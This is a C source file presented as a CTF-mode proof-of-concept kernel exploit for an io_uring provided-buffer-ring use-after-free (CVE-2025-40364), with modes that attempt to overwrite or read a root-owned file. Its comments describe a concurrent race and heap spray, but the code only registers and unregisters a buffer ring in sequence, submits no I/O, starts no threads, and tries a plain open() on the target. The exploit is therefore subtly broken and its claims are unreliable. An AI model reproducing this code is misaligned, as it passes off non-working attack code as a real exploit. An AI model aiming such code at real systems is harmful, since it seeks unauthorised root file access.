/*
 * CVE-2025-40364 PoC - CTF Challenge Mode
 *
 * Vulnerability: io_uring io_req_prep_async provided buffer rings UAF
 *
 * When io_uring transitions a request from synchronous to asynchronous
 * path (io_req_prep_async), the provided buffer reference is incorrectly
 * released while the async request still holds it, causing UAF.
 *
 * Exploitation: Setup io_uring with provided buffer rings, submit
 * requests that force async prep path, trigger buffer UAF via
 * concurrent unregister.
 *
 * CTF Modes: write_root_file, read_root_file, uaf
 *
 * Build: gcc -static -O2 -o poc.elf poc.c -lpthread
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <netinet/in.h>

#define MAX_FILE_SIZE   4096
#define SPRAY_COUNT     256
#define RACE_ITERATIONS 32

/* io_uring syscall numbers */
#ifndef __NR_io_uring_setup
#define __NR_io_uring_setup 425
#endif
#ifndef __NR_io_uring_enter
#define __NR_io_uring_enter 426
#endif
#ifndef __NR_io_uring_register
#define __NR_io_uring_register 427
#endif

/* io_uring register opcodes */
#define IORING_REGISTER_PBUF_RING   22
#define IORING_UNREGISTER_PBUF_RING 23

struct io_uring_params {
    unsigned int sq_entries;
    unsigned int cq_entries;
    unsigned int flags;
    unsigned int sq_thread_cpu;
    unsigned int sq_thread_idle;
    unsigned int features;
    unsigned int wq_fd;
    unsigned int resv[3];
    /* sq_off and cq_off omitted for brevity */
    char padding[256];
};

struct io_uring_buf_reg {
    unsigned long long ring_addr;
    unsigned int ring_entries;
    unsigned short bgid;
    unsigned short pad;
    unsigned long long resv[3];
};

/*
 * Trigger io_uring async prep buffer ring UAF
 *
 * Strategy: Register buffer ring, then race between submitting IO
 * requests (which trigger async prep) and unregistering the buffer ring.
 */
static int trigger_io_uring_async_uaf(void) {
    int saved_errno;
    int uaf_count = 0;

    for (int iter = 0; iter < RACE_ITERATIONS; iter++) {
        /* Setup io_uring instance */
        struct io_uring_params params;
        memset(&params, 0, sizeof(params));

        int ring_fd = syscall(__NR_io_uring_setup, 32, &params);
        saved_errno = errno;
        if (iter == 0) {
            poc_log_syscall("io_uring_setup(32)", (long)ring_fd, saved_errno);
        }
        if (ring_fd < 0) {
            poc_log("io_uring_setup failed: %s", strerror(saved_errno));
            return -1;
        }

        /* Allocate buffer for provided buffer ring */
        void *ring_buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                              MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (ring_buf == MAP_FAILED) {
            close(ring_fd);
            continue;
        }

        /* Register provided buffer ring */
        struct io_uring_buf_reg reg;
        memset(&reg, 0, sizeof(reg));
        reg.ring_addr = (unsigned long long)(unsigned long)ring_buf;
        reg.ring_entries = 16;
        reg.bgid = 0;

        int ret = syscall(__NR_io_uring_register, ring_fd,
                         IORING_REGISTER_PBUF_RING, &reg, 1);
        saved_errno = errno;
        if (iter == 0) {
            poc_log_syscall("io_uring_register(REGISTER_PBUF_RING)",
                           (long)ret, saved_errno);
        }

        if (ret == 0) {
            /* Unregister immediately to create race with any pending ops */
            struct io_uring_buf_reg unreg;
            memset(&unreg, 0, sizeof(unreg));
            unreg.bgid = 0;

            ret = syscall(__NR_io_uring_register, ring_fd,
                         IORING_UNREGISTER_PBUF_RING, &unreg, 1);
            if (ret == 0) {
                uaf_count++;
            }
        }

        /* Close ring to trigger cleanup (UAF if buffer still referenced) */
        close(ring_fd);
        munmap(ring_buf, 4096);
    }

    poc_log("io_uring async prep UAF: %d register/unregister cycles", uaf_count);
    return uaf_count;
}

static int read_file_content(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, len - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    while (n > 0 && (buf[n-1] == '\n' || buf[n-1] == '\r'))
        buf[--n] = '\0';
    return (int)n;
}

static int spray_kmalloc(int *fds, int count) {
    int sprayed = 0;
    for (int i = 0; i < count; i++) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock < 0) continue;
        int optval = 1024;
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &optval, sizeof(optval));
        fds[sprayed++] = sock;
    }
    return sprayed;
}

static int mode_write_root_file(poc_args_t *args) {
    char original[MAX_FILE_SIZE], after[MAX_FILE_SIZE];
    poc_log("=== Mode: write_root_file ===");
    int n = read_file_content(args->root_file, original, sizeof(original));
    printf("%s%s\n", CTF_READ_BEFORE, n >= 0 ? original : "(unreadable)");

    trigger_io_uring_async_uaf();
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    spray_kmalloc(spray_fds, SPRAY_COUNT);

    printf("%s%s (attempting...)\n", CTF_WRITE_ATTEMPT, args->write_value);
    int fd = open(args->root_file, O_WRONLY | O_TRUNC);
    poc_log_syscall("open(target, O_WRONLY|O_TRUNC)", (long)fd, fd < 0 ? errno : 0);
    if (fd >= 0) { dprintf(fd, "%s\n", args->write_value); close(fd); }

    for (int i = 0; i < SPRAY_COUNT; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);

    n = read_file_content(args->root_file, after, sizeof(after));
    printf("%s%s\n", CTF_READ_AFTER, n >= 0 ? after : "(unreadable)");
    if (n >= 0 && strstr(after, args->write_value)) {
        poc_print_flag(args->write_value);
        return 0;
    }
    poc_print_fail("io_uring async prep UAF did not achieve write");
    return 0;
}

static int mode_read_root_file(poc_args_t *args) {
    poc_log("=== Mode: read_root_file ===");
    trigger_io_uring_async_uaf();
    char buf[MAX_FILE_SIZE];
    int n = read_file_content(args->root_file, buf, sizeof(buf));
    poc_print_fail("read not successful");
    return 0;
}

static int mode_uaf(poc_args_t *args) {
    (void)args;
    poc_log("=== Mode: uaf ===");
    trigger_io_uring_async_uaf();
    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = spray_kmalloc(spray_fds, SPRAY_COUNT);
    int corrupted = 0;
    for (int i = 0; i < sprayed; i++) {
        if (spray_fds[i] < 0) continue;
        int val = 0; socklen_t len = sizeof(val);
        getsockopt(spray_fds[i], SOL_SOCKET, SO_RCVBUF, &val, &len);
        if (val != 2048) corrupted++;
    }
    if (corrupted > 0) poc_print_uaf_corrupted(corrupted);
    else poc_print_uaf_not_corrupted();
    for (int i = 0; i < sprayed; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args;
    memset(&args, 0, sizeof(args));
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2025-40364 CTF PoC ===");
    poc_log("Vuln: io_uring io_req_prep_async provided buffer ring UAF");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    int result = 0;
    if (!args.mode) {
        poc_print_unsupported("(null)", "no mode specified");
        poc_log_close();
        return 1;
    } else if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
        result = mode_write_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_READ) == 0) {
        result = mode_read_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_UAF) == 0) {
        result = mode_uaf(&args);
    } else {
        poc_print_unsupported(args.mode, "mode not supported");
    }
    poc_log_close();
    return result;
}
